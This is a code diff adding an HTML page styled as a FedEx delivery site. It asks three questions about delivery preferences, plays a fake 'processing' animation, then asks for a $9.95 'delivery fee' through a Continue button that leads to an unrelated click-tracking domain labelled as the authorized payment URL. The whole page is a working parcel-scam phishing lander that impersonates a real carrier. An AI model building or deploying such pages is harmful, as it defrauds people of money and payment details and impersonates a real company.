@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Select Your Delivery Preferences</title>
+<style>
+  :root{
+    --fedex-purple:#4D148C;
+    --fedex-orange:#FF6600;
+    --ink:#1f2430;
+    --muted:#6a6f76;
+    --rule:rgba(0,0,0,.06);
+    --card:rgba(255,255,255,.96);
+    --shadow:0 20px 50px rgba(0,0,0,.18);
+    --header-h:72px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+
+  /* === Background with light blur === */
+  body{
+    margin:0;
+    font:16px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    color:var(--ink);
+    background-color:#0000;
+  }
+
+  /* Soft-blurred background image */
+  body::before{
+    content:"";
+    position:fixed;
+    inset:var(--header-h) 0 0 0;
+    background-image:
+      url('fedexbackground.png'),
+      url('fedexbackground.pnd');
+    background-position:center top;
+    background-size:100% auto;
+    background-repeat:no-repeat;
+    filter:blur(3px) brightness(0.95); /* reduced blur & more natural tone */
+    transform:scale(1.03);
+    z-index:-2;
+  }
+
+  /* Gentle overlay to improve contrast */
+  body::after{
+    content:"";
+    position:fixed;
+    inset:var(--header-h) 0 0 0;
+    background:linear-gradient(to bottom,
+      rgba(255,255,255,.05),
+      rgba(255,255,255,.12) 25%,
+      rgba(255,255,255,.18) 45%,
+      transparent 70%);
+    z-index:-1;
+  }
+
+  /* Fixed FedEx top bar */
+  header.topbar{
+    position:fixed; top:0; left:0; right:0; z-index:1000;
+    height:var(--header-h);
+    background-image:
+      url('fedexbar.png'),
+      url('fedexbaer.png');
+    background-size:100% auto;
+    background-position:top center;
+    background-repeat:no-repeat;
+    background-color:var(--fedex-purple);
+    box-shadow:0 2px 6px rgba(0,0,0,.12);
+  }
+
+  main{margin-top:var(--header-h);}
+
+  .viewport{
+    min-height:calc(100vh - var(--header-h));
+    display:flex; align-items:center; justify-content:center;
+    padding:48px 16px;
+  }
+
+  .card{
+    width:100%; max-width:840px;
+    background:var(--card);
+    border:1px solid rgba(0,0,0,.08);
+    border-radius:18px;
+    box-shadow:var(--shadow);
+    padding:32px 32px 26px;
+    backdrop-filter:saturate(140%) blur(6px);
+  }
+
+  .headline{
+    margin:0 0 6px;
+    font-weight:700;
+    font-size:clamp(30px,5.8vw,46px);
+    line-height:1.1;
+  }
+  .lede{margin:0 0 18px; color:var(--muted)}
+
+  .q{min-height:160px; display:flex; flex-direction:column; gap:16px; justify-content:center}
+  .q h2{margin:0; font-size:24px; font-weight:800; letter-spacing:.2px; color:#0f1220}
+
+  .answers{display:flex; flex-wrap:wrap; gap:14px; margin-top:8px}
+  .btn{
+    appearance:none; cursor:pointer; border-radius:28px;
+    padding:12px 22px; font-weight:800; letter-spacing:.2px;
+    border:2px solid transparent;
+    transition:background .18s ease, border-color .18s ease, transform .04s ease, box-shadow .18s ease;
+  }
+  .btn:active{transform:translateY(1px)}
+
+  .btn-primary{background:#4D148C; color:#fff; box-shadow:0 1px 0 rgba(0,0,0,.05)}
+  .btn-primary:hover{background:#3a0f6d}
+
+  .btn-outline{background:#F4ECFB; color:#4D148C; border-color:#4D148C;}
+  .btn-outline:hover{background:#E9DBF9}
+
+  .btn:focus-visible{
+    outline:3px solid var(--fedex-orange);
+    outline-offset:2px;
+  }
+
+  .muted{color:var(--muted); font-size:14px; margin-top:2px}
+
+  .progress{width:100%; height:12px; border-radius:999px; background:rgba(255,255,255,.6); overflow:hidden; border:1px solid var(--rule); margin-top:6px}
+  .bar{height:100%; width:0; background:linear-gradient(90deg, #4D148C, #FF6600)}
+</style>
+</head>
+<body>
+  <header class="topbar"></header>
+
+  <main>
+    <div class="viewport">
+      <section class="card" aria-live="polite">
+        <h1 class="headline">Select Your Delivery Preferences</h1>
+        <p class="lede">Answer the quick questions below to continue.</p>
+        <div class="q" id="q"><noscript>Please enable JavaScript to continue.</noscript></div>
+      </section>
+    </div>
+  </main>
+
+<script>
+  var STEPS = [
+    { prompt: "Where do you want your parcel delivered?", options: ["Work", "Home"] },
+    { prompt: "When would you like to receive the parcel?", options: ["Morning", "Afternoon"] },
+    { prompt: "Is this your first time receiving express delivery from our service?", options: ["Yes", "No"] }
+  ];
+  var AUTHORIZED_PAYMENT_URL = "https://cudsr.bemobtrcks.com/click";
+
+  (function(){
+    var qEl = document.getElementById('q');
+    var step = 0;
+    var answers = [];
+
+    function renderQuestion(){
+      var s = STEPS[step];
+      var btns = s.options.map(function(o,i){
+        var cls = i===0 ? 'btn btn-primary' : 'btn btn-outline';
+        return '<button class="'+cls+'" data-answer="'+o+'" type="button">'+o+'</button>';
+      }).join('');
+      qEl.innerHTML = '<h2>'+s.prompt+'</h2>' +
+                      '<div class="answers">'+btns+'</div>' +
+                      '<div class="muted">Step '+(step+1)+' of '+STEPS.length+'</div>';
+
+      Array.prototype.forEach.call(qEl.querySelectorAll('[data-answer]'), function(b){
+        b.addEventListener('click', function(){
+          answers.push({q:s.prompt, a:b.getAttribute('data-answer')});
+          step++;
+          if(step < STEPS.length) renderQuestion();
+          else renderProcessing();
+        });
+      });
+    }
+
+    function renderProcessing(){
+      qEl.innerHTML = '<h2>PROCESSING YOUR ANSWERS</h2>' +
+        '<div class="progress"><div class="bar" id="procBar"></div></div>' +
+        '<p class="muted">This takes about 4 seconds…</p>';
+      var bar = document.getElementById('procBar');
+      if(bar){
+        bar.style.transition = 'width 4s linear';
+        requestAnimationFrame(function(){ bar.style.width = '100%'; });
+      }
+      setTimeout(renderSuccess, 4050);
+    }
+
+    function renderSuccess(){
+      qEl.innerHTML = '<h2 style="margin-bottom:8px;">Preferences Established</h2>' +
+        '<p class="muted" style="margin:0 0 14px">To schedule delivery, continue to the next page to confirm your address. Delivery fee:$ 9.95.</p>' +
+        '<div class="answers"><a class="btn btn-primary" href="'+AUTHORIZED_PAYMENT_URL+'" target="_blank" rel="noopener noreferrer">Continue</a></div>' +
+        '<p class="muted" style="margin-top:10px">Opens in a new tab.</p>';
+      try{ console.log("Selections:", answers); }catch(e){}
+    }
+
+    renderQuestion();
+  })();
+</script>
+</body>
+</html>
